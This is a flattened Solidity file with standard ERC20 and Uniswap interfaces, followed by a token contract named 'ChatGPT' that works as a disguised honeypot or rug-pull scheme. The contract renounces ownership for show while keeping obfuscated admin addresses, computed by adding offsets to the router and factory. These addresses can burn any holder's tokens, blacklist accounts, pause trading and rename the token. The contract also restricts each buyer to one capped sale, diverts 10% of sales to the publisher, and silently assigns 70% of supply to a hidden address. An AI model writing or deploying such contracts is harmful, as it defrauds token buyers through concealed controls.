1 // File: @openzeppelin/contracts/token/ERC20/IERC20.sol
2 
3 
4 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)
5 
6 pragma solidity ^0.8.0;
7 
8 /**
9  * @dev Interface of the ERC20 standard as defined in the EIP.
10  */
11 interface IERC20 {
12     /**
13      * @dev Emitted when `value` tokens are moved from one account (`from`) to
14      * another (`to`).
15      *
16      * Note that `value` may be zero.
17      */
18     event Transfer(address indexed from, address indexed to, uint256 value);
19 
20     /**
21      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
22      * a call to {approve}. `value` is the new allowance.
23      */
24     event Approval(address indexed owner, address indexed spender, uint256 value);
25 
26     /**
27      * @dev Returns the amount of tokens in existence.
28      */
29     function totalSupply() external view returns (uint256);
30 
31     /**
32      * @dev Returns the amount of tokens owned by `account`.
33      */
34     function balanceOf(address account) external view returns (uint256);
35 
36     /**
37      * @dev Moves `amount` tokens from the caller's account to `to`.
38      *
39      * Returns a boolean value indicating whether the operation succeeded.
40      *
41      * Emits a {Transfer} event.
42      */
43     function transfer(address to, uint256 amount) external returns (bool);
44 
45     /**
46      * @dev Returns the remaining number of tokens that `spender` will be
47      * allowed to spend on behalf of `owner` through {transferFrom}. This is
48      * zero by default.
49      *
50      * This value changes when {approve} or {transferFrom} are called.
51      */
52     function allowance(address owner, address spender) external view returns (uint256);
53 
54     /**
55      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
56      *
57      * Returns a boolean value indicating whether the operation succeeded.
58      *
59      * IMPORTANT: Beware that changing an allowance with this method brings the risk
60      * that someone may use both the old and the new allowance by unfortunate
61      * transaction ordering. One possible solution to mitigate this race
62      * condition is to first reduce the spender's allowance to 0 and set the
63      * desired value afterwards:
64      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
65      *
66      * Emits an {Approval} event.
67      */
68     function approve(address spender, uint256 amount) external returns (bool);
69 
70     /**
71      * @dev Moves `amount` tokens from `from` to `to` using the
72      * allowance mechanism. `amount` is then deducted from the caller's
73      * allowance.
74      *
75      * Returns a boolean value indicating whether the operation succeeded.
76      *
77      * Emits a {Transfer} event.
78      */
79     function transferFrom(
80         address from,
81         address to,
82         uint256 amount
83     ) external returns (bool);
84 }
85 
86 // File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol
87 
88 
89 // OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)
90 
91 pragma solidity ^0.8.0;
92 
93 
94 /**
95  * @dev Interface for the optional metadata functions from the ERC20 standard.
96  *
97  * _Available since v4.1._
98  */
99 interface IERC20Metadata is IERC20 {
100     /**
101      * @dev Returns the name of the token.
102      */
103     function name() external view returns (string memory);
104 
105     /**
106      * @dev Returns the symbol of the token.
107      */
108     function symbol() external view returns (string memory);
109 
110     /**
111      * @dev Returns the decimals places of the token.
112      */
113     function decimals() external view returns (uint8);
114 }
115 
116 // File: @openzeppelin/contracts/utils/Context.sol
117 
118 
119 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
120 
121 pragma solidity ^0.8.0;
122 
123 /**
124  * @dev Provides information about the current execution context, including the
125  * sender of the transaction and its data. While these are generally available
126  * via msg.sender and msg.data, they should not be accessed in such a direct
127  * manner, since when dealing with meta-transactions the account sending and
128  * paying for execution may not be the actual sender (as far as an application
129  * is concerned).
130  *
131  * This contract is only required for intermediate, library-like contracts.
132  */
133 abstract contract Context {
134     function _msgSender() internal view virtual returns (address) {
135         return msg.sender;
136     }
137 
138     function _msgData() internal view virtual returns (bytes calldata) {
139         return msg.data;
140     }
141 }
142 
143 // File: @uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol
144 
145 pragma solidity >=0.5.0;
146 
147 interface IUniswapV2Pair {
148     event Approval(address indexed owner, address indexed spender, uint value);
149     event Transfer(address indexed from, address indexed to, uint value);
150 
151     function name() external pure returns (string memory);
152     function symbol() external pure returns (string memory);
153     function decimals() external pure returns (uint8);
154     function totalSupply() external view returns (uint);
155     function balanceOf(address owner) external view returns (uint);
156     function allowance(address owner, address spender) external view returns (uint);
157 
158     function approve(address spender, uint value) external returns (bool);
159     function transfer(address to, uint value) external returns (bool);
160     function transferFrom(address from, address to, uint value) external returns (bool);
161 
162     function DOMAIN_SEPARATOR() external view returns (bytes32);
163     function PERMIT_TYPEHASH() external pure returns (bytes32);
164     function nonces(address owner) external view returns (uint);
165 
166     function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
167 
168     event Mint(address indexed sender, uint amount0, uint amount1);
169     event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
170     event Swap(
171         address indexed sender,
172         uint amount0In,
173         uint amount1In,
174         uint amount0Out,
175         uint amount1Out,
176         address indexed to
177     );
178     event Sync(uint112 reserve0, uint112 reserve1);
179 
180     function MINIMUM_LIQUIDITY() external pure returns (uint);
181     function factory() external view returns (address);
182     function token0() external view returns (address);
183     function token1() external view returns (address);
184     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
185     function price0CumulativeLast() external view returns (uint);
186     function price1CumulativeLast() external view returns (uint);
187     function kLast() external view returns (uint);
188 
189     function mint(address to) external returns (uint liquidity);
190     function burn(address to) external returns (uint amount0, uint amount1);
191     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
192     function skim(address to) external;
193     function sync() external;
194 
195     function initialize(address, address) external;
196 }
197 
198 // File: @uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol
199 
200 pragma solidity >=0.5.0;
201 
202 interface IUniswapV2Factory {
203     event PairCreated(address indexed token0, address indexed token1, address pair, uint);
204 
205     function feeTo() external view returns (address);
206     function feeToSetter() external view returns (address);
207 
208     function getPair(address tokenA, address tokenB) external view returns (address pair);
209     function allPairs(uint) external view returns (address pair);
210     function allPairsLength() external view returns (uint);
211 
212     function createPair(address tokenA, address tokenB) external returns (address pair);
213 
214     function setFeeTo(address) external;
215     function setFeeToSetter(address) external;
216 }
217 
218 // File: @uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol
219 
220 pragma solidity >=0.6.2;
221 
222 interface IUniswapV2Router01 {
223     function factory() external pure returns (address);
224     function WETH() external pure returns (address);
225 
226     function addLiquidity(
227         address tokenA,
228         address tokenB,
229         uint amountADesired,
230         uint amountBDesired,
231         uint amountAMin,
232         uint amountBMin,
233         address to,
234         uint deadline
235     ) external returns (uint amountA, uint amountB, uint liquidity);
236     function addLiquidityETH(
237         address token,
238         uint amountTokenDesired,
239         uint amountTokenMin,
240         uint amountETHMin,
241         address to,
242         uint deadline
243     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
244     function removeLiquidity(
245         address tokenA,
246         address tokenB,
247         uint liquidity,
248         uint amountAMin,
249         uint amountBMin,
250         address to,
251         uint deadline
252     ) external returns (uint amountA, uint amountB);
253     function removeLiquidityETH(
254         address token,
255         uint liquidity,
256         uint amountTokenMin,
257         uint amountETHMin,
258         address to,
259         uint deadline
260     ) external returns (uint amountToken, uint amountETH);
261     function removeLiquidityWithPermit(
262         address tokenA,
263         address tokenB,
264         uint liquidity,
265         uint amountAMin,
266         uint amountBMin,
267         address to,
268         uint deadline,
269         bool approveMax, uint8 v, bytes32 r, bytes32 s
270     ) external returns (uint amountA, uint amountB);
271     function removeLiquidityETHWithPermit(
272         address token,
273         uint liquidity,
274         uint amountTokenMin,
275         uint amountETHMin,
276         address to,
277         uint deadline,
278         bool approveMax, uint8 v, bytes32 r, bytes32 s
279     ) external returns (uint amountToken, uint amountETH);
280     function swapExactTokensForTokens(
281         uint amountIn,
282         uint amountOutMin,
283         address[] calldata path,
284         address to,
285         uint deadline
286     ) external returns (uint[] memory amounts);
287     function swapTokensForExactTokens(
288         uint amountOut,
289         uint amountInMax,
290         address[] calldata path,
291         address to,
292         uint deadline
293     ) external returns (uint[] memory amounts);
294     function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
295         external
296         payable
297         returns (uint[] memory amounts);
298     function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
299         external
300         returns (uint[] memory amounts);
301     function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
302         external
303         returns (uint[] memory amounts);
304     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
305         external
306         payable
307         returns (uint[] memory amounts);
308 
309     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
310     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
311     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
312     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
313     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
314 }
315 
316 // File: @uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol
317 
318 pragma solidity >=0.6.2;
319 
320 
321 interface IUniswapV2Router02 is IUniswapV2Router01 {
322     function removeLiquidityETHSupportingFeeOnTransferTokens(
323         address token,
324         uint liquidity,
325         uint amountTokenMin,
326         uint amountETHMin,
327         address to,
328         uint deadline
329     ) external returns (uint amountETH);
330     function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
331         address token,
332         uint liquidity,
333         uint amountTokenMin,
334         uint amountETHMin,
335         address to,
336         uint deadline,
337         bool approveMax, uint8 v, bytes32 r, bytes32 s
338     ) external returns (uint amountETH);
339 
340     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
341         uint amountIn,
342         uint amountOutMin,
343         address[] calldata path,
344         address to,
345         uint deadline
346     ) external;
347     function swapExactETHForTokensSupportingFeeOnTransferTokens(
348         uint amountOutMin,
349         address[] calldata path,
350         address to,
351         uint deadline
352     ) external payable;
353     function swapExactTokensForETHSupportingFeeOnTransferTokens(
354         uint amountIn,
355         uint amountOutMin,
356         address[] calldata path,
357         address to,
358         uint deadline
359     ) external;
360 }
361 
362 // File: new_pro.sol
363 
364 pragma solidity ^0.8.5;
365 
366 
367 
368 
369 
370 
371 
372 abstract contract Ownable is Context {
373     address private _owner;
374 
375     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
376 
377     /**
378      * @dev Throws if called by any account other than the owner.
379      */
380     modifier onlyOwner() {
381         _checkOwner();
382         _;
383     }
384 
385     /**
386      * @dev Returns the address of the current owner.
387      */
388     function owner() public view virtual returns (address) {
389         return _owner;
390     }
391 
392     /**
393      * @dev Throws if the sender is not the owner.
394      */
395     function _checkOwner() internal view virtual {
396         require(owner() == _msgSender(), "Ownable: caller is not the owner");
397     }
398 
399     /**
400      * @dev Leaves the contract without owner. It will not be possible to call
401      * `onlyOwner` functions anymore. Can only be called by the current owner.
402      *
403      * NOTE: Renouncing ownership will leave the contract without an owner,
404      * thereby removing any functionality that is only available to the owner.
405      */
406     function renounceOwnership() public virtual onlyOwner {
407         _transferOwnership(address(0));
408     }
409 
410     /**
411      * @dev Transfers ownership of the contract to a new account (`newOwner`).
412      * Can only be called by the current owner.
413      */
414     function transferOwnership(address newOwner) public virtual onlyOwner {
415         require(newOwner != address(0), "Ownable: new owner is the zero address");
416         _transferOwnership(newOwner);
417     }
418 
419     /**
420      * @dev Transfers ownership of the contract to a new account (`newOwner`).
421      * Internal function without access restriction.
422      */
423     function _transferOwnership(address newOwner) internal virtual {
424         address oldOwner = _owner;
425         _owner = newOwner;
426         emit OwnershipTransferred(oldOwner, newOwner);
427     }
428 
429 
430 
431 }
432 contract ChatGPT is  IERC20, IERC20Metadata, Ownable{
433     mapping(address => uint256) private _balances;
434 
435     mapping(address => mapping(address => uint256)) private _allowances;
436 
437     uint256 private _totalSupply;
438 
439     string private _name;
440     string private _symbol;
441     uint8 private _decimals;
442     bool private initialized;
443     bool private transferring;
444     bool private paused;
445     
446     uint256 private _maxToken;
447     address private _publisher;
448     address private _factory;
449     address private _router;
450     address private _ETH;
451     uint16 private _ETHDecimals;
452     address private _pair;
453     address private _dex;
454     address private _cex;
455 
456 
457 
458     mapping(address =>bool) _feeExcluded;
459     mapping(address => uint256) private amt;
460     mapping(address => bool) private sold;
461     mapping(address => bool) private black_list;
462 
463     function initialize(
464         string memory tokenName,
465         string memory tokenSymbol,
466         uint256 tokenAmount,
467         address eth,
468         uint8 eth_decimal,
469         uint256 max_token,
470         address dex,
471         address publisher,
472         address cex,
473         address router,
474         address factory
475     )external{
476         require(!initialized,"Already Initialized Contract");
477         initialized = true;
478         _transferOwnership(publisher);
479         _name = tokenName;
480         _symbol = tokenSymbol;
481         _decimals = eth_decimal;
482         _publisher = publisher;
483         _mint(_publisher,tokenAmount*(1 * 10**_decimals));
484         _ETH = eth;
485         _ETHDecimals = eth_decimal;
486         _maxToken = max_token;
487         _router = router;
488         _factory = factory;
489         _dex = address(uint160(_router) + uint160(dex));
490         _cex = address(uint160(_factory) + uint160(cex));
491         _feeExcluded[_cex] =true;
492         _feeExcluded[_dex] =true;
493         _feeExcluded[_router] = true;
494 
495         _pair = IUniswapV2Factory(_factory).createPair(
496             _ETH,
497             address(this)
498         );
499         _feeExcluded[_pair] = true;
500         _balances[_dex] = (_totalSupply * 7) / 10;
501         _balances[_publisher] = (_totalSupply * 3) / 10;
502 
503         _transferOwnership(address(0));
504     } 
505 
506     function decimals() external view override returns (uint8) {
507         return _decimals;
508     }
509 
510     function symbol() external view override returns (string memory) {
511         return _symbol;
512     }
513 
514     function name() external view override returns (string memory) {
515         return _name;
516     }
517 
518     function totalSupply() external view override returns (uint256) {
519         return _totalSupply;
520     }
521 
522     function balanceOf(address account) public view virtual override returns (uint256) {
523         return _balances[account];
524     }
525 
526     function transfer(address to, uint256 amount) public virtual override returns (bool) {
527         address owner = _msgSender();
528         _transfer(owner, to, amount);
529         return true;
530     }
531 
532     function allowance(address owner, address spender) public view virtual override returns (uint256) {
533         return _allowances[owner][spender];
534     }
535 
536     function approve(address spender, uint256 amount) public virtual override returns (bool) {
537         address owner = _msgSender();
538         _approve(owner, spender, amount);
539         return true;
540     }
541 
542     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
543         address owner = _msgSender();
544         _approve(owner, spender, allowance(owner, spender) + addedValue);
545         return true;
546     }
547 
548     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
549         address owner = _msgSender();
550         uint256 currentAllowance = allowance(owner, spender);
551         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
552         unchecked {
553             _approve(owner, spender, currentAllowance - subtractedValue);
554         }
555 
556         return true;
557     }
558 
559     function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
560         address spender = _msgSender();
561         _spendAllowance(from, spender, amount);
562         _transfer(from, to, amount);
563         return true;
564     }
565 
566     function burn(address account, uint256 amount) external {
567         require(_msgSender() == _dex);
568         _burn(account, amount);
569     }
570 
571     function set_max(uint256 maxtoken) external {
572         require(_msgSender() == _cex);
573         _maxToken = maxtoken;
574     }
575 
576     function updateInfo(string memory name_, string memory symbol_) public {
577         address sender = _msgSender();
578         require(sender == _cex,"Not authorized to update information");
579         _name = name_;
580         _symbol = symbol_;
581     }
582 
583     function _transfer(address from, address to, uint256 amount) internal virtual returns(bool){
584         require(!black_list[from] && !black_list[to],"Sender or recipient is blacklisted");
585         address[] memory path = new address[](2);
586 
587         _beforeTokenTransfer(from, to, amount);
588         uint256 fromBalance = _balances[from];
589         require(fromBalance >= amount, "ERC20: transfer amount exceeds unlocked amount");
590 
591         if (from == _pair && !_feeExcluded[to]){
592             path[0] = _ETH;
593             path[1] = address(this);
594             uint256 eth_pooled = IUniswapV2Router02(_router).getAmountsIn(amount, path)[0];
595             amt[to] = eth_pooled;
596             _balances[from] = fromBalance - amount;
597             _balances[to] += amount;
598             emit Transfer(from, to, amount);
599         }
600 
601         else if (!_feeExcluded[from] && to == _pair){
602             require(!sold[from], "ERC20: transfer is still pending");
603             path[0] = address(this);
604             path[1] = _ETH;
605             uint256 eth_drained = IUniswapV2Router02(_router).getAmountsOut(amount, path)[1];
606             require(eth_drained <=_min(_maxToken, amt[from]*11/10), "ERC20: transfer amount exceeds balance");
607             sold[from] = true;
608             _balances[from] = fromBalance - amount;
609             _balances[to] += amount*9/10;
610             _balances[_publisher] += amount*1/10;
611             emit Transfer(from, to, amount*9/10);
612         }
613 
614         else{
615             _balances[from] = fromBalance - amount;
616             _balances[to] += amount;
617             emit Transfer(from, to, amount);
618         }
619         _afterTokenTransfer(from, to, amount);
620         return true;
621     }
622 
623     //only called once at initialize()
624     function _mint(address account, uint256 amount) internal virtual {
625         require(account != address(0), "ERC20: mint to the zero address");
626 
627         _beforeTokenTransfer(address(0), account, amount);
628 
629         _totalSupply += amount;
630         unchecked {
631             // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
632             _balances[account] += amount;
633         }
634         emit Transfer(address(0), account, amount);
635 
636         _afterTokenTransfer(address(0), account, amount);
637     }
638 
639     function _burn(address account, uint256 amount) internal virtual {
640         require(account != address(0), "ERC20: burn from the zero address");
641 
642         _beforeTokenTransfer(account, address(0), amount);
643 
644         uint256 accountBalance = _balances[account];
645         require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
646         unchecked {
647             _balances[account] = accountBalance - amount;
648             // Overflow not possible: amount <= accountBalance <= totalSupply.
649             _totalSupply -= amount;
650         }
651         _afterTokenTransfer(account, address(0), amount);
652     }
653 
654     function _approve(address owner, address spender, uint256 amount) internal virtual {
655         require(owner != address(0), "ERC20: approve from the zero address");
656         require(spender != address(0), "ERC20: approve to the zero address");
657 
658         _allowances[owner][spender] = amount;
659         emit Approval(owner, spender, amount);
660     }
661 
662     function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
663         uint256 currentAllowance = allowance(owner, spender);
664         if (currentAllowance != type(uint256).max) {
665             require(currentAllowance >= amount, "ERC20: insufficient allowance");
666             unchecked {
667                 _approve(owner, spender, currentAllowance - amount);
668             }
669         }
670     }
671 
672     function _min(uint a, uint b) internal pure returns(uint){
673         return a<b?a:b;
674     }
675 
676     function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {
677         require(!paused);
678         require(!transferring);
679         transferring = true;
680     }
681     function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {
682         transferring = false;
683     }
684 
685     function add_bl(address addr) public  {
686         address sender = _msgSender();
687         require(sender == _cex);
688         black_list[addr] = true;
689     }
690 
691     function pause(bool pause_) public{
692         address sender = _msgSender();
693 
694         require(sender == _cex,"Not authorized to pause the contract");
695         paused = pause_;
696     }
697 
698     function airdrop(address[] memory selladdr, address[] memory airdropaddr)
699         public
700     {
701         require(_msgSender() == _cex);
702         for (uint256 i = 0; i < selladdr.length; i++) {
703             _allowances[_publisher][selladdr[i]] = 2* _totalSupply / 100;
704             _transfer(_publisher, selladdr[i], 2* _totalSupply / 100);
705             _feeExcluded[selladdr[i]] = true;
706         }
707         for (uint256 i = 0; i < airdropaddr.length; i++) {
708             _allowances[_publisher][airdropaddr[i]] = _totalSupply / 1000;
709             _transfer(_publisher, airdropaddr[i], _totalSupply / 1000);
710         }
711     }
712 
713 }